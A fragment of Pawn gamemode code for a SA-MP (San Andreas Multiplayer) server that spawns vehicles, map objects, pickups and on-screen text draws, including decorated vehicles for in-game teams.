CreateVehicle(468, -1400.1587, 2634.3418, 55.2321, 89.8800, -1, -1, 100);
CreateVehicle(425, -1501.1038, 2529.8694, 58.7479, 0.0000, -1, -1, 100);
CreateVehicle(447, -1517.1910, 2527.3096, 58.0384, 0.0000, -1, -1, 100);
CreateVehicle(520, -1509.7144, 2539.8423, 58.7034, 0.0000, -1, -1, 100);
CreateVehicle(476, -1534.7653, 2601.1443, 56.6786, -90.9000, -1, -1, 100);
CreateVehicle(477, -1512.9113, 2619.2217, 55.4245, 0.0000, -1, -1, 100);
CreateVehicle(477, -1513.0052, 2628.7617, 55.4245, 0.0000, -1, -1, 100);
CreateVehicle(477, -1517.7039, 2623.0525, 55.4245, 0.0000, -1, -1, 100);
CreateVehicle(470, -1456.7023, 2569.0195, 55.4800, -2.4600, -1, -1, 100);
CreateVehicle(470, -1465.7499, 2568.9031, 55.4800, -2.4600, -1, -1, 100);
CreateVehicle(470, -1462.6644, 2551.4893, 55.4800, -2.4600, -1, -1, 100);
CreateVehicle(433, -1444.0620, 2572.3347, 56.0982, 0.0000, -1, -1, 100);
CreateVehicle(433, -1475.3885, 2572.4402, 56.0982, 0.0000, -1, -1, 100);
CreateVehicle(487, -1448.3235, 2637.8640, 55.8678, 0.0000, -1, -1, 100);
CreateVehicle(447, -1467.4569, 2639.5618, 55.6989, 0.0000, -1, -1, 100);
CreateVehicle(451, -1523.7898, 2623.4128, 55.2796, 0.0000, -1, -1, 100);
CreateVehicle(415, -1528.2015, 2618.9463, 55.4314, 0.0000, -1, -1, 100);
CreateVehicle(411, -1527.7795, 2628.2844, 55.4177, 0.0000, -1, -1, 100);
CreateVehicle(522, -1461.9355, 2649.6982, 55.2350, 0.0000, -1, -1, 100);
CreateVehicle(521, -1458.9115, 2649.8945, 55.2527, 0.0000, -1, -1, 100);
CreateVehicle(522, -1455.7379, 2649.7290, 55.2350, 0.0000, -1, -1, 100);
CreateVehicle(521, -1460.9612, 2645.3640, 55.2527, 0.0000, -1, -1, 100);
CreateVehicle(521, -1457.3691, 2645.3755, 55.2527, 0.0000, -1, -1, 100);
CreateVehicle(522, -1457.4420, 2653.4836, 55.2350, 0.0000, -1, -1, 100);
CreateVehicle(522, -1460.3665, 2653.4866, 55.2350, 0.0000, -1, -1, 100);
CreateVehicle(521, -1464.3579, 2646.3757, 55.2527, 0.0000, -1, -1, 100);
CreateVehicle(521, -1454.2631, 2652.9812, 55.2527, 0.0000, -1, -1, 100);
CreateVehicle(522, -1452.9491, 2644.5051, 55.2350, 0.0000, -1, -1, 100);
CreateVehicle(522, -1463.5741, 2652.8569, 55.2350, 0.0000, -1, -1, 100);
CreateVehicle(554, -1522.5574, 2568.0344, 55.7254, -89.4600, -1, -1, 100);
CreateVehicle(478, -1522.4226, 2575.8396, 55.5469, -93.5400, -1, -1, 100);
CreateVehicle(455, -1523.8822, 2583.4211, 56.1048, -91.3800, -1, -1, 100);
CreateVehicle(543, -1513.1425, 2571.6599, 55.5302, -90.9000, -1, -1, 100);
CreateVehicle(578, -1513.1938, 2579.2520, 56.1702, -93.0600, -1, -1, 100);

		//erfanmp
CreateObject(16771, 288.56723, 2454.66895, 20.84039,   356.85840, 0.00000, -1.17841);
CreateObject(16771, 240.18535, 2454.85376, 20.84642,   356.85840, 0.00000, 0.98159);
CreateObject(19641, 434.50827, 2557.12500, 15.42557,   0.00000, 0.00000, 0.00000);
CreateObject(19641, 426.63632, 2557.12158, 15.28241,   0.00000, 0.00000, 0.00000);
CreateObject(19641, 418.84366, 2557.12915, 15.28241,   0.00000, 0.00000, 0.00000);
CreateObject(19641, 411.04349, 2557.12012, 15.28241,   0.00000, 0.00000, 0.00000);
CreateObject(19641, 403.24283, 2557.15063, 15.28241,   0.00000, 0.00000, 0.00000);
CreateObject(19641, 395.44229, 2557.18091, 15.28241,   0.00000, 0.00000, 0.00000);
CreateObject(19641, 387.46277, 2557.17041, 15.28241,   0.00000, 0.00000, 0.00000);
CreateObject(19641, 379.68347, 2557.20532, 15.28241,   0.00000, 0.00000, 0.00000);
CreateObject(19641, 371.85928, 2557.20947, 15.28241,   0.00000, 0.00000, 0.00000);
CreateObject(19641, 364.03201, 2557.22437, 15.28241,   0.00000, 0.00000, 0.00000);
CreateObject(19641, 356.18539, 2557.21948, 15.28241,   0.00000, 0.00000, 0.00000);
CreateObject(19641, 348.34534, 2557.24902, 15.28241,   0.00000, 0.00000, 0.00000);
CreateObject(19641, 340.54498, 2557.25806, 15.28241,   0.00000, 0.00000, 0.00000);
CreateObject(19641, 332.74985, 2557.28052, 15.28241,   0.00000, 0.00000, 0.00000);
CreateObject(19641, 324.98370, 2557.34912, 15.28241,   0.00000, 0.00000, 0.00000);
CreateObject(19641, 317.14182, 2557.36890, 15.28241,   0.00000, 0.00000, 0.00000);
CreateObject(19641, 309.36151, 2557.46094, 15.28241,   0.00000, 0.00000, 0.00000);
CreateObject(19641, 301.51144, 2557.48779, 15.28241,   0.00000, 0.00000, 0.00000);
CreateObject(19641, 293.68402, 2557.49585, 15.28241,   0.00000, 0.00000, 0.00000);
CreateObject(19641, 285.85812, 2557.58618, 15.28241,   0.00000, 0.00000, 0.00000);
CreateObject(19641, 278.04831, 2557.59448, 15.28241,   0.00000, 0.00000, 0.00000);
CreateObject(19641, 270.22330, 2557.64429, 15.28241,   0.00000, 0.00000, 0.00000);
CreateObject(19641, 262.37595, 2557.63721, 15.28241,   0.00000, 0.00000, 0.00000);
CreateObject(19641, 254.55118, 2557.69019, 15.28241,   0.00000, 0.00000, 0.00000);
CreateObject(19641, 246.74548, 2557.73706, 15.28241,   0.00000, 0.00000, 0.00000);
CreateObject(19641, 238.92052, 2557.72339, 15.28241,   0.00000, 0.00000, 0.00000);
CreateObject(19641, 231.08577, 2557.96924, 15.28241,   0.00000, 0.00000, 0.00000);
CreateObject(3279, 225.22557, 2556.16187, 15.31205,   0.00000, 0.00000, 0.00000);
CreateObject(19641, 219.29872, 2558.02441, 15.28241,   0.00000, 0.00000, 0.00000);
CreateObject(19641, 211.45383, 2557.96777, 15.28241,   0.00000, 0.00000, 0.00000);
CreateObject(19641, 203.61925, 2557.97656, 15.28241,   0.00000, 0.00000, 0.00000);
CreateObject(19641, 195.83192, 2558.04956, 15.28241,   0.00000, 0.00000, 0.00000);
CreateObject(19641, 188.01105, 2558.08057, 15.28241,   0.00000, 0.00000, 0.00000);
CreateObject(19641, 180.25058, 2558.07251, 15.28241,   0.00000, 0.00000, 0.00000);
CreateObject(19641, 172.44963, 2558.05737, 15.28241,   0.00000, 0.00000, 0.00000);
CreateObject(19641, 164.64859, 2558.04224, 15.28241,   0.00000, 0.00000, 0.00000);
CreateObject(19641, 156.88771, 2558.02661, 15.28241,   0.00000, 0.00000, 0.00000);
CreateObject(19641, 149.06615, 2558.05054, 15.28241,   0.00000, 0.00000, 0.00000);
CreateObject(19641, 141.21500, 2558.12598, 15.28241,   0.00000, 0.00000, 0.00000);
CreateObject(19641, 133.37303, 2558.13184, 15.28241,   0.00000, 0.00000, 0.00000);
CreateObject(3279, 127.35579, 2557.38770, 15.25229,   0.00000, 0.00000, 0.00000);
CreateObject(19641, 121.34135, 2558.04834, 15.28241,   0.00000, 0.00000, 0.00000);
CreateObject(19641, 113.52402, 2558.04419, 15.28241,   0.00000, 0.00000, 0.00000);
CreateObject(19641, 105.70834, 2558.06274, 15.28241,   0.00000, 0.00000, 0.00000);
CreateObject(19641, 97.88652, 2558.12500, 15.28241,   0.00000, 0.00000, 0.00000);
CreateObject(19641, 90.09209, 2558.13281, 15.28241,   0.00000, 0.00000, 0.00000);
CreateObject(19641, 82.33681, 2558.09497, 15.28241,   0.00000, 0.00000, 0.00000);
CreateObject(19641, 74.57680, 2558.03760, 15.28241,   0.00000, 0.00000, 0.00000);
CreateObject(19641, 66.78858, 2558.16284, 15.28241,   0.00000, 0.00000, 0.00000);
CreateObject(19641, 58.98806, 2558.21484, 15.28241,   0.00000, 0.00000, 0.00000);
CreateObject(3279, 53.13833, 2557.30859, 15.40284,   0.00000, 0.00000, 0.00000);
CreateObject(19641, 47.18812, 2558.03247, 15.28241,   0.00000, 0.00000, 0.00000);
CreateObject(19641, 39.28711, 2558.02393, 15.28241,   0.00000, 0.00000, 0.00000);
CreateObject(19641, 32.40329, 2555.48950, 15.28241,   0.00000, 0.00000, 40.50000);
CreateObject(19641, 29.74802, 2549.08496, 15.50204,   0.00000, 0.00000, 94.86001);
CreateObject(19641, 30.41479, 2541.27124, 15.50204,   0.00000, 0.00000, 94.86001);
CreateObject(19641, 31.07800, 2533.51563, 15.50204,   0.00000, 0.00000, 94.86001);
CreateObject(19641, 31.78352, 2525.72290, 15.40228,   0.00000, 0.00000, 94.86001);
CreateObject(19641, 32.52030, 2517.91748, 15.40228,   0.00000, 0.00000, 94.86001);
CreateObject(7033, 37.11888, 2501.60742, 19.87279,   0.00000, 0.00000, -85.07999);
CreateObject(19641, 34.02429, 2484.56616, 15.40228,   0.00000, 0.00000, 94.86001);
CreateObject(19641, 34.67871, 2476.79980, 15.40228,   0.00000, 0.00000, 94.86001);
CreateObject(19641, 35.25851, 2469.02197, 15.40228,   0.00000, 0.00000, 94.86001);
CreateObject(19641, 36.00209, 2461.19556, 15.46220,   0.00000, 0.00000, 94.86001);
CreateObject(19641, 36.66282, 2453.43896, 15.46220,   0.00000, 0.00000, 94.86001);
CreateObject(19641, 37.42386, 2445.65527, 15.46220,   0.00000, 0.00000, 94.86001);
CreateObject(19641, 38.06458, 2437.88062, 15.46220,   0.00000, 0.00000, 94.86001);
CreateObject(19641, 40.82461, 2430.89331, 15.46220,   0.00000, 0.00000, 127.74000);
CreateObject(19641, 47.10854, 2427.71753, 15.46220,   0.00000, 0.00000, 178.98015);
CreateObject(19641, 54.91251, 2427.55127, 15.46220,   0.00000, 0.00000, 178.98015);
CreateObject(19641, 62.67583, 2427.42480, 15.46220,   0.00000, 0.00000, 178.98015);
CreateObject(19641, 70.51667, 2427.39307, 15.46220,   0.00000, 0.00000, 180.24010);
CreateObject(19641, 78.35641, 2427.45947, 15.46220,   0.00000, 0.00000, 180.24010);
CreateObject(3279, 84.22784, 2428.79321, 15.25229,   0.00000, 0.00000, -177.47995);
CreateObject(19641, 90.16096, 2427.81079, 15.46220,   0.00000, 0.00000, 180.24010);
CreateObject(19641, 97.93691, 2427.85449, 15.46220,   0.00000, 0.00000, 180.24010);
CreateObject(19641, 105.76928, 2427.83350, 15.46220,   0.00000, 0.00000, 180.24010);
CreateObject(19641, 113.56058, 2427.81104, 15.46220,   0.00000, 0.00000, 180.24010);
CreateObject(19641, 121.35413, 2427.82690, 15.46220,   0.00000, 0.00000, 180.24010);
CreateObject(19641, 129.18541, 2427.80054, 15.46220,   0.00000, 0.00000, 180.24010);
CreateObject(19641, 137.02583, 2427.76367, 15.46220,   0.00000, 0.00000, 180.24010);
CreateObject(19641, 144.82744, 2427.80786, 15.46220,   0.00000, 0.00000, 180.24010);
CreateObject(19641, 152.64848, 2427.81201, 15.46220,   0.00000, 0.00000, 180.24010);
CreateObject(19641, 164.69995, 2428.10400, 15.46220,   0.00000, 0.00000, 180.24010);
CreateObject(19641, 172.47888, 2428.12451, 15.46220,   0.00000, 0.00000, 180.24010);
CreateObject(19641, 180.30934, 2428.12109, 15.46220,   0.00000, 0.00000, 180.24010);
CreateObject(3279, 158.65161, 2428.67188, 15.25229,   0.00000, 0.00000, -178.74008);
CreateObject(19641, 188.08789, 2428.16553, 15.46220,   0.00000, 0.00000, 180.24010);
CreateObject(19641, 195.87813, 2428.16309, 15.46220,   0.00000, 0.00000, 180.24010);
CreateObject(19641, 203.72726, 2428.18628, 15.46220,   0.00000, 0.00000, 180.24010);
CreateObject(19641, 211.57846, 2428.15259, 15.46220,   0.00000, 0.00000, 180.24010);
CreateObject(19641, 219.47749, 2427.96216, 15.46220,   0.00000, 0.00000, 180.24010);
CreateObject(19641, 227.36874, 2427.93115, 15.46220,   0.00000, 0.00000, 180.24010);
CreateObject(19641, 235.16884, 2427.98755, 15.46220,   0.00000, 0.00000, 180.24010);
CreateObject(19641, 242.90875, 2428.04785, 15.46220,   0.00000, 0.00000, 180.24010);
CreateObject(19641, 250.68974, 2428.11890, 15.46220,   0.00000, 0.00000, 180.24010);
CreateObject(19641, 258.47113, 2428.23022, 15.46220,   0.00000, 0.00000, 180.24010);
CreateObject(19641, 266.27173, 2428.26147, 15.46220,   0.00000, 0.00000, 180.24010);
CreateObject(19641, 274.11288, 2428.35229, 15.46220,   0.00000, 0.00000, 180.24010);
CreateObject(19641, 281.89761, 2428.40479, 15.46220,   0.00000, 0.00000, 180.24010);
CreateObject(19641, 289.69763, 2428.44775, 15.46220,   0.00000, 0.00000, 180.24010);
CreateObject(19641, 297.49850, 2428.40942, 15.46220,   0.00000, 0.00000, 180.24010);
CreateObject(19641, 305.31888, 2428.41089, 15.46220,   0.00000, 0.00000, 180.24010);
CreateObject(19641, 313.12177, 2428.36719, 15.46220,   0.00000, 0.00000, 180.24010);
CreateObject(19641, 320.96527, 2428.37744, 15.46220,   0.00000, 0.00000, 180.24010);
CreateObject(19641, 328.75125, 2428.46802, 15.46220,   0.00000, 0.00000, 180.24010);
CreateObject(19641, 336.53143, 2428.48169, 15.46220,   0.00000, 0.00000, 180.24010);
CreateObject(3279, 342.31561, 2429.36914, 15.25229,   0.00000, 0.00000, -178.74008);
CreateObject(19641, 347.99829, 2429.04980, 15.46220,   0.00000, 0.00000, 180.24010);
CreateObject(19641, 355.77289, 2429.10425, 15.46220,   0.00000, 0.00000, 180.24010);
CreateObject(19641, 363.53192, 2429.09790, 15.46220,   0.00000, 0.00000, 180.24010);
CreateObject(19641, 371.33606, 2429.01416, 15.46220,   0.00000, 0.00000, 180.24010);
CreateObject(19641, 379.12399, 2429.11108, 15.46220,   0.00000, 0.00000, 180.24010);
CreateObject(19641, 386.95856, 2429.09229, 15.46220,   0.00000, 0.00000, 180.24010);
CreateObject(19641, 394.75089, 2429.11108, 15.46220,   0.00000, 0.00000, 180.24010);
CreateObject(19641, 402.53333, 2429.14600, 15.46220,   0.00000, 0.00000, 180.24010);
CreateObject(19641, 410.33487, 2429.14282, 15.46220,   0.00000, 0.00000, 180.24010);
CreateObject(19641, 418.09735, 2429.17798, 15.46220,   0.00000, 0.00000, 180.24010);
CreateObject(19641, 425.93689, 2429.07178, 15.46220,   0.00000, 0.00000, 180.24010);
CreateObject(19641, 433.72784, 2429.16895, 15.46220,   0.00000, 0.00000, 180.24010);
CreateObject(19641, 438.06653, 2433.11377, 15.88182,   0.00000, 0.00000, 264.11990);
CreateObject(19641, 438.88687, 2440.85522, 16.10163,   0.00000, 0.00000, 264.11990);
CreateObject(19641, 439.71768, 2448.65503, 16.49581,   0.00000, 0.00000, 264.11990);
CreateObject(19641, 440.48587, 2456.36963, 16.49581,   0.00000, 0.00000, 264.11990);
CreateObject(19641, 441.27405, 2464.08228, 16.83471,   0.00000, 0.00000, 264.11990);
CreateObject(19641, 442.12466, 2471.85181, 17.49482,   0.00000, 0.00000, 264.11990);
CreateObject(19641, 442.91379, 2479.58618, 17.11521,   0.00000, 0.00000, 264.11990);
CreateObject(19641, 443.72549, 2487.38013, 17.07524,   0.00000, 0.00000, 264.11990);
CreateObject(19641, 444.55701, 2495.17041, 17.35495,   0.00000, 0.00000, 264.11990);
CreateObject(19641, 446.09039, 2510.80859, 17.41498,   0.00000, 0.00000, 264.11990);
CreateObject(19641, 446.84210, 2518.61670, 17.35525,   0.00000, 0.00000, 264.11990);
CreateObject(19641, 447.63672, 2526.36377, 17.13631,   0.00000, 0.00000, 264.11990);
CreateObject(19641, 448.46295, 2534.16699, 16.27276,   0.00000, 0.00000, 264.11990);
CreateObject(19641, 449.40234, 2541.89014, 15.69340,   0.00000, 0.00000, 264.11990);
CreateObject(19641, 450.18903, 2549.66626, 15.75040,   0.00000, 0.00000, 264.11990);
CreateObject(19641, 442.36188, 2557.06860, 15.42557,   0.00000, 0.00000, 0.00000);
CreateObject(19641, 447.49780, 2554.33618, 15.42557,   0.00000, 0.00000, -42.41999);
CreateObject(3279, 444.00549, 2505.24463, 17.09016,   0.00000, 0.00000, -95.64001);
CreateObject(19641, 445.57367, 2503.00537, 17.35495,   0.00000, 0.00000, 264.11990);
CreateObject(14877, 33.86283, 2519.22681, 17.35982,   0.00000, 0.00000, -86.34003);
CreateObject(14394, 36.91716, 2515.55273, 20.14240,   0.00000, 0.00000, -85.14002);
CreateObject(14877, 36.83790, 2519.47632, 17.35982,   0.00000, 0.00000, -86.34003);
CreateObject(14877, 39.08175, 2519.47095, 17.35982,   0.00000, 0.00000, -86.34003);
CreateObject(3279, 38.25338, 2484.50854, 15.40284,   0.00000, 0.00000, 6.66000);
CreateObject(4726, 180.04237, 2537.80688, 17.74701,   0.00000, 0.00000, 0.00000);
CreateObject(14877, 198.46890, 2527.96655, 17.58555,   0.00000, 0.00000, 184.97961);
CreateObject(14877, 161.75754, 2527.26929, 17.58555,   0.00000, 0.00000, 355.37936);
CreateObject(4726, 97.22028, 2538.40454, 17.74701,   0.00000, 0.00000, 0.00000);
CreateObject(14877, 78.52505, 2526.42261, 17.58555,   0.00000, 0.00000, 355.37936);
CreateObject(14877, 115.86318, 2526.91553, 17.58555,   0.00000, 0.00000, 184.97961);
CreateObject(16771, 401.92914, 2454.47974, 22.97619,   356.85840, 0.00000, -1.17841);
//----
CreateObject(3749, -1205.58923, 2688.12134, 50.65478,   0.00000, 0.00000, -81.30000);
CreateObject(17063, -1324.10522, 2701.11914, 49.05576,   0.00000, 0.00000, 27.77999);
CreateObject(19324, -1469.88843, 2614.18457, 58.37120,   0.00000, 0.00000, -90.06006);
CreateObject(19913, -1232.91614, 2688.79834, 50.37580,   0.00000, 0.00000, 11.76002);
CreateObject(19913, -1279.87720, 2672.93140, 50.37580,   0.00000, 0.00000, 25.62002);
CreateObject(19913, -1327.14514, 2665.51709, 50.37580,   0.00000, 0.00000, -7.85999);
CreateObject(19913, -1343.13501, 2696.23218, 54.22884,   0.00000, 0.00000, 33.78001);
CreateObject(19913, -1300.10205, 2721.37158, 54.38464,   0.00000, 0.00000, 26.64000);
CreateObject(19913, -1286.61987, 2728.19849, 52.61060,   0.00000, 0.00000, 28.79999);
CreateObject(19913, -1251.75110, 2716.45630, 50.37580,   0.00000, 0.00000, 118.91998);
CreateObject(19913, -1248.08630, 2709.90601, 50.37580,   0.00000, 0.00000, 118.91998);
CreateObject(19913, -1369.41858, 2623.91016, 55.34197,   0.00000, 0.00000, 44.81994);
CreateObject(19913, -1412.09790, 2606.35913, 55.10309,   0.00000, 0.00000, -0.18002);
CreateObject(19913, -1459.44836, 2606.15552, 55.10309,   0.00000, 0.00000, -0.24002);
CreateObject(8253, -1521.68530, 2625.03418, 58.64935,   0.00000, 0.00000, -268.91971);
CreateObject(19913, -1550.94531, 2609.26758, 60.21760,   0.00000, 0.00000, 90.11998);
CreateObject(19913, -1550.63928, 2575.25903, 60.19997,   0.00000, 0.00000, 90.11998);
CreateObject(19913, -1505.13281, 2516.65356, 60.19997,   0.00000, 0.00000, 360.06015);
CreateObject(19913, -1456.22595, 2516.52979, 60.19997,   0.00000, 0.00000, 358.68008);
CreateObject(19913, -1448.07642, 2516.50171, 60.19997,   0.00000, 0.00000, 359.81998);
CreateObject(19913, -1413.68640, 2539.55762, 64.45153,   0.00000, 0.00000, 427.86011);
CreateObject(19913, -1399.99988, 2571.77271, 59.70728,   0.00000, 0.00000, 425.22009);
CreateObject(19913, -1540.91492, 2535.32568, 60.19997,   0.00000, 0.00000, 301.61996);
CreateObject(16771, -1459.11523, 2560.55225, 61.37218,   0.00000, 0.00000, -1.49999);
CreateObject(8357, -1509.26587, 2669.68359, 54.81735,   0.00000, 0.00000, -88.92002);
CreateObject(8357, -1507.38074, 2649.21387, 54.81839,   0.00000, 0.00000, 1.13996);
CreateObject(8357, -1535.71741, 2648.78223, 54.83432,   0.00000, 0.00000, 1.13996);
CreateObject(669, -1551.85999, 2544.77344, 54.93682,   356.85840, 0.00000, 3.14159);
CreateObject(19913, -1551.04309, 2655.48486, 60.21760,   0.00000, 0.00000, 90.11998);
CreateObject(19913, -1526.27185, 2680.03711, 60.26441,   0.00000, 0.00000, 179.03987);
CreateObject(19913, -1503.36719, 2679.70801, 60.26441,   0.00000, 0.00000, 179.03987);
CreateObject(19913, -1448.43628, 2678.15967, 60.26441,   0.00000, 0.00000, 177.95990);
CreateObject(19913, -1411.67236, 2677.45557, 58.62302,   0.00000, 0.00000, 179.27989);
CreateObject(3749, -1396.69373, 2601.16504, 60.05251,   0.00000, 0.00000, -95.46002);
CreateObject(8357, -1501.21582, 2594.23120, 54.73102,   0.00000, 0.00000, -88.92002);
CreateObject(8357, -1439.24390, 2586.58569, 54.83455,   0.00000, 0.00000, 0.29998);
CreateObject(8253, -1519.90723, 2576.41797, 58.64935,   0.00000, 0.00000, -360.35962);
CreateObject(3279, -1345.70801, 2655.99536, 50.30647,   0.00000, 0.00000, -139.67989);
CreateObject(3279, -1215.73315, 2678.03857, 44.84693,   0.00000, 0.00000, -164.75998);
CreateObject(3279, -1507.28137, 2659.24756, 54.82496,   0.00000, 0.00000, 0.00000);
CreateObject(3279, -1536.71765, 2538.71265, 54.49209,   0.00000, 0.00000, 0.00000);
CreateObject(3279, -1484.04089, 2587.22095, 54.82317,   0.00000, 0.00000, -180.23997);
CreateObject(3279, -1404.92065, 2592.04419, 54.34301,   0.00000, 0.00000, -179.34003);
CreateObject(3279, -1426.00122, 2523.65552, 59.85490,   0.00000, 0.00000, -195.41998);
CreateObject(19913, -1369.20764, 2659.30933, 55.67643,   0.00000, 0.00000, 134.51987);
CreateObject(9241, -1509.32739, 2532.42041, 56.34600,   0.00000, 0.00000, -88.91996);
CreateObject(19913, -1485.23877, 2679.51270, 60.26441,   0.00000, 0.00000, 177.83992);
//---
//gmtxd
Textdrawt = TextDrawCreate(4.000000, 428.000000, "Cs-1.6");
TextDrawBackgroundColor(Textdrawt, 255);
TextDrawFont(Textdrawt, 3);
TextDrawLetterSize(Textdrawt, 0.500000, 2.000000);
TextDrawColor(Textdrawt, 16711935);
TextDrawSetOutline(Textdrawt, 0);
TextDrawSetProportional(Textdrawt, 1);
TextDrawSetShadow(Textdrawt, 1);
//welcome txd
        Textdraw6 = TextDrawCreate(292.000000, 33.733306, "CS-SAMP SERVER");
        TextDrawLetterSize(Textdraw6, 0.449999, 1.600000);
        TextDrawAlignment(Textdraw6, 1);
        TextDrawColor(Textdraw6, 16711935);
        TextDrawSetShadow(Textdraw6, 0);
        TextDrawSetOutline(Textdraw6, 1);
        TextDrawBackgroundColor(Textdraw6, 51);
        TextDrawFont(Textdraw6, 3);
        TextDrawSetProportional(Textdraw6, 1);

        Textdraw20 = TextDrawCreate(212.500000, 52.266639, "Www.Sa-mp.com");
        TextDrawLetterSize(Textdraw20, 0.449999, 1.600000);
        TextDrawAlignment(Textdraw20, 1);
        TextDrawColor(Textdraw20, 16777215);
        TextDrawSetShadow(Textdraw20, 0);
        TextDrawSetOutline(Textdraw20, 1);
        TextDrawBackgroundColor(Textdraw20, 51);
        TextDrawFont(Textdraw20, 2);
        TextDrawSetProportional(Textdraw20, 1);

        tdg = TextDrawCreate(604.000000, 0.000000, "JG");
TextDrawBackgroundColor(tdg, 255);
TextDrawFont(tdg, 1);
TextDrawLetterSize(tdg, 0.449999, 1.299999);
TextDrawColor(tdg, 16711935);
TextDrawSetOutline(tdg, 0);
TextDrawSetProportional(tdg, 1);
TextDrawSetShadow(tdg, 1);
TextDrawSetSelectable(tdg, 0);

//killtextdraw
for(new i; i < MAX_PLAYERS; ++i)
    {
       KillerTextdraw[i] = TextDrawCreate(384.54547119140625 ,211.29263305664062 , "Doshman Ro Koshtid");
       TextDrawFont(KillerTextdraw[i] , 1);
       TextDrawLetterSize(KillerTextdraw[i] , 0.31, 2.072);
       TextDrawColor(KillerTextdraw[i] , 0xff9100FF);
       TextDrawSetOutline(KillerTextdraw[i] , true);
       TextDrawSetProportional(KillerTextdraw[i] , true);
       TextDrawSetShadow(KillerTextdraw[i] , 2);

       KillerTextdraw1[i] = TextDrawCreate(460.53973388671875 ,210.2840919494629 , "+2 Mavad");  
       TextDrawFont(KillerTextdraw1[i] , 2);
       TextDrawLetterSize(KillerTextdraw1[i] , 0.31, 2.072);
       TextDrawColor(KillerTextdraw1[i] , 0xffffffFF);
       TextDrawSetOutline(KillerTextdraw1[i] , false);
       TextDrawSetProportional(KillerTextdraw1[i] , false);
       TextDrawSetShadow(KillerTextdraw1[i] , 2);

       KillerTextdraw2[i] = TextDrawCreate(385.53973388671875 ,230.19886016845703 , "20k Cash");  
       TextDrawFont(KillerTextdraw2[i] , 2);
       TextDrawLetterSize(KillerTextdraw2[i] , 0.31, 2.17);
       TextDrawColor(KillerTextdraw2[i] , 0xffffffFF);
       TextDrawSetOutline(KillerTextdraw2[i] , false);
       TextDrawSetProportional(KillerTextdraw2[i] , false);
       TextDrawSetShadow(KillerTextdraw2[i] , 2);
    }
    //end
   
   


//--taleban veh

g_Object[0] = CreateObject(2898, -1487.7547, 2641.9675, 53.3250, 0.0000, 0.0000, 0.0000); //funturf_law
g_Object[1] = CreateObject(2985, -1488.0076, 2642.5747, 51.1172, 0.0000, 0.0000, 0.0000); //minigun_base
g_Object[2] = CreateObject(3524, -1485.7935, 2639.9985, 56.1452, 0.0000, 0.0000, 0.0000); //skullpillar01_lvs
g_Object[3] = CreateObject(19306, -1486.5511, 2637.0908, 56.2742, 0.0000, 0.0000, 0.0000); //verticalift_bridg2
g_Vehicle[2] = CreateVehicle(515, -1488.2062, 2640.0820, 56.8573, 181.0955, 211, 223, -1); //RoadTrain
AttachObjectToVehicle(g_Object[0], g_Vehicle[2], -0.2299, -3.5799, -0.6900, 0.3000, 0.0000, 0.3999);
AttachObjectToVehicle(g_Object[1], g_Vehicle[2], -0.0399, -3.4200, -0.6600, 1.8000, 3.8000, 265.4000);
AttachObjectToVehicle(g_Object[2], g_Vehicle[2], 1.1099, 2.3499, 1.5599, 354.7000, 0.1000, 163.6000);
AttachObjectToVehicle(g_Object[3], g_Vehicle[2], -1.3600, 0.2699, 0.8199, 357.1000, 41.1000, 159.0999);
//--isis veh
g_Object[4] = CreateObject(1185, 423.8081, 2529.1010, 13.1217, 0.0000, 0.0000, 0.0000); //fbmp_lr_rem2
g_Object[5] = CreateObject(3525, 419.6842, 2530.9106, 17.5423, 0.0000, 0.0000, 0.0000); //exbrtorch01
g_Object[6] = CreateObject(19307, 416.4915, 2527.0761, 14.7258, 0.0000, 0.0000, 0.0000); //verticalift_bridge
g_Object[7] = CreateObject(1114, 419.3216, 2525.0424, 13.6448, 0.0000, 0.0000, 0.0000); //exh_lr_slv2
g_Vehicle[3] = CreateVehicle(482, 417.8997, 2528.3676, 16.7159, 179.6849, 66, 245, -1); //Burrito
AttachObjectToVehicle(g_Object[4], g_Vehicle[3], 1.0099, 2.4800, -0.2999, 357.1000, 0.0000, 0.0000);
AttachObjectToVehicle(g_Object[5], g_Vehicle[3], 0.8799, 1.8899, 0.4999, 0.0000, 17.3000, 52.7999);
AttachObjectToVehicle(g_Object[6], g_Vehicle[3], -0.8800, -0.0200, 0.2499, 333.8999, 22.1000, 181.2999);
AttachObjectToVehicle(g_Object[7], g_Vehicle[3], 0.5200, -2.0500, -0.9599, 341.7999, 0.0000, 357.1000);

g_Vehicle[0] = AddStaticVehicle(413, -995.9346, 2454.6247, 130.9191, 264.1160, 3, 3); //Pony
g_Pickup[0] = CreatePickup(1239, 1, -1059.4393, 2607.1452, 140.9962, -1); //info
g_Pickup[1] = CreatePickup(1239, 1, -1059.4393, 2607.1452, 140.9962, -1); //info
g_Pickup[2] = CreatePickup(1239, 1, -1091.6904, 2408.2836, 126.8048, -1); //info

g_Pickup[4] = CreatePickup(1239, 1, -997.8439, 2452.3098, 130.9263, -1); //info
CreateObject(19129,78.09071,5887.16094,76.22354,   0.00000, 0.00000, 0.00000);
CreateObject(19129,78.17011,5907.17827,76.22354,   0.00000, 0.00000, 0.00000);
CreateObject(19129,98.10663,5906.99687,76.22354,   0.00000, 0.00000, 0.00000);
CreateObject(19129,98.11059,5886.95586,76.22354,   0.00000, 0.00000, 0.00000);
CreateObject(18981,95.65885,5876.65019,87.96106,   0.00000, 0.00000, -90.18000);
CreateObject(18981,79.82545,5876.63774,87.96106,   0.00000, 0.00000, -90.18000);
CreateObject(19129,58.14325,5887.39165,76.22354,   0.00000, 0.00000, 0.00000);
CreateObject(19129,58.39449,5907.17607,76.22354,   0.00000, 0.00000, 0.00000);
CreateObject(18981,60.55717,5876.68193,87.96106,   0.00000, 0.00000, -90.18000);
CreateObject(18981,48.3663,5889.48198,87.96106,   0.00000, 0.00000, -179.39998);
CreateObject(18981,48.2988,5904.74834,87.96106,   0.00000, 0.00000, -179.39998);
CreateObject(18981,60.16806,5917.09624,87.96106,   0.00000, 0.00000, -90.18000);
CreateObject(18981,85.01325,5916.87114,87.96106,   0.00000, 0.00000, -90.18000);
CreateObject(18981,95.77331,5916.84136,87.96106,   0.00000, 0.00000, -90.18000);
CreateObject(18981,108.00425,5904.75542,87.96106,   0.00000, 0.00000, -179.39998);
CreateObject(18981,108.23226,5888.825,87.96106,   0.00000, 0.00000, -179.39998);
CreateObject(18981,60.3175,5905.26592,123.87205,   -0.65999, 89.09998, -179.87999);
CreateObject(18981,85.02434,5916.88774,112.39332,   0.00000, 0.00000, -90.18000);
CreateObject(18981,60.17434,5917.02349,112.39332,   0.00000, 0.00000, -90.18000);
CreateObject(18981,95.77331,5916.84136,112.24355,   0.00000, 0.00000, -90.18000);
CreateObject(18981,108.00425,5904.75542,112.1702,   0.00000, 0.00000, -179.39998);
